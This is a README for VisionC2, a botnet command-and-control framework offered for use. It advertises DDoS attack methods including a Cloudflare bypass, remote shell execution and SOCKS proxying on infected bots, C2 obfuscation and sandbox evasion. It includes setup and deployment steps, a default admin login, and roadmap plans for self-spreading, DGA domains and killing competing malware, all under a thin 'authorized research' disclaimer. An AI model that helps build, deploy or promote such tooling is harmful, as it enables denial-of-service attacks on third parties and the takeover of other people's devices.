
# VisionC2 – Advanced Botnet Command & Control Framework

![VisionC2 Banner](https://img.shields.io/badge/VisionNet-V1.5-red)
![Go Version](https://img.shields.io/badge/Go-1.23.0+-blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)
![License](https://img.shields.io/badge/License-MIT-yellow)

**VisionC2** is an advanced Command & Control framework focused on stress testing, featuring enterprise-grade encryption, multi-architecture support, and remote shell/reverse socks capabilities.

## 📋 Table of Contents

- [✨ Features](#-features)
- [🚀 Quick Start](#-quick-start)
- [🏗️ Architecture](#️-architecture)
- [📖 Usage Guide](#-usage-guide)
- [🔒 Security Features](#-security-features)
- [⚖️ Disclaimer](#️-disclaimer)

## ✨ Features

### 🎯 Bot Capabilities
- **Layer 4 Attacks**: UDP, TCP, SYN, ACK, GRE, DNS-based methods
- **Layer 7 Attacks**: HTTP/HTTPS/TLS with HTTP/2 fingerprinting, Cloudflare UAM bypass with captcha solving
- **Remote Code Execution**: Shell command execution with real-time output or fire-and-forget mode
- **SOCKS5 Proxy**: Turn agents into SOCKS5 proxy servers

### 🔒 Security & Stealth
- **TLS 1.3** with perfect forward secrecy (zero plain-text communications)
- **No hardcoded C2**: Multi-layer obfuscation (RC4, XOR, byte substitution, MD5)
- **HMAC Authentication**: Challenge–response verification for agent integrity
- **Anti-Analysis**: Multi-stage sandbox and analysis environment detection

### ⚡ Performance
- **2 servers = 30k-40k RPS / 2–6 Gbps** (depending on method and target)
- **14+ architecture support**
- **Automated setup** (5-minute installation)

## 🚀 Quick Start

### Prerequisites
```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen
# Go 1.23+ required - download from https://go.dev/dl/
```

### Installation
```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
python3 setup.py
```

### Basic Usage
1. **Start C2 Server**:
   ```bash
   cd cnc
   screen ./cnc
   ```

2. **Connect Admin Console**:
   ```bash
   nc YOUR_SERVER_IP YOUR_ADMIN_PORT
   # Type 'spamtec' for login prompt
   # Default credentials: admin:changeme
   ```

3. **Deploy Bots**: Binaries available in `bot/bins/` after building

## 🏗️ Architecture

```
Admin Console
     │ TLS 1.3
     ▼
   C2 Server
     │
 Bot Registry
     ▲ TLS 1.3
     │
  Bot Agents
 (14+ architectures)
```

### C2 Resolution Order
1. DoH TXT Record
2. DNS TXT Record  
3. A Record
4. Direct IP

**Supported Inputs**: `lookup.example.com` · `c2.example.com` · `192.168.1.100`

## 🛠️ Installation Details

### Setup Wizard
VisionC2 uses an interactive setup wizard that handles:
- **C2 Configuration**: Address, ports, and settings
- **Security Setup**: Magic codes, encryption keys, protocol versions
- **Certificate Generation**: 4096-bit RSA keys and TLS certificates
- **Binary Compilation**: CNC server and bot binaries for 14+ architectures

### Wizard Options
```
[1] Full Setup        → New C2, magic code, certs (fresh install)
[2] C2 URL Update    → Change C2 address only  
[0] Exit
```

### Configuration File
After setup, review `setup_config.txt`:
```
============================================================
VisionC2 Configuration
============================================================
[C2 Server]
C2 Address: c2.example.com:443
Admin Port: 420
Bot Port: 443

[Security]
Magic Code: IhxWZGJDzdSviX$s
Protocol Version: r5.6-stable

[Usage]
1. Start CNC: cd cnc && ./cnc
2. Connect Admin: nc c2.example.com 420
3. Login trigger: spamtec
4. Bot binaries: bot/bins/
```

## 📖 Usage Guide

### C2 Server Ports
- **Port 443 (TLS)**: Bot connections (fixed, cannot be changed)
- **Admin Port**: Admin console connections (configurable, default: 420)

### Bot Deployment
- Binaries are automatically built for 14+ architectures
- Located in `bot/bins/` directory
- No code modifications required for deployment

### Admin Console Commands
Type `help` after login to see available commands. Detailed command reference available in [COMMANDS.md](https://github.com/Syn2Much/VisionC2/blob/main/cnc/COMMANDS.md).


## 📋 Development Roadmap

### In Progress
- BubbleTea/TUI View CNC Panel
- Enhanced Daemonize with better stealth
- Locker/Killer to stay on the device and eliminate competing malware

### Planned Features
- Auto Generated DGA Fallback Domains for bot
- Spread/Self-Rep Mechanism 
- Single Instance/Port Takeover Networking capabilities

Detailed changelog available in [CHANGELOG.md](https://github.com/Syn2Much/VisionC2/blob/main/CHANGELOG.md).

## ⚖️ Disclaimer

**FOR AUTHORIZED SECURITY RESEARCH ONLY**

### Liability Notice:
The developers assume no liability and are not responsible for any misuse, damage, or legal consequences resulting from the use of this software. By using VisionC2, you agree to use it responsibly and legally.

## 🤝 Support & Community

### Documentation
- **Full Guide**: [USAGE.md](https://github.com/Syn2Much/VisionC2/blob/main/USAGE.md)
- **Command Reference**: [COMMANDS.md](https://github.com/Syn2Much/VisionC2/blob/main/cnc/COMMANDS.md)
- **Changelog**: [CHANGELOG.md](https://github.com/Syn2Much/VisionC2/blob/main/CHANGELOG.md)

### Acknowledgments
- Built upon the framework of [1birdo](https://github.com/1Birdo)'s BotnetGo

### Support Channels
- **GitHub Issues**: For bug reports and feature requests
- **Contact**: [dev@sinners.city](mailto:dev@sinners.city) 
- **Community**: GitHub discussions and documentation

### License
This project is licensed under the GNU License - see the LICENSE file for details.

---

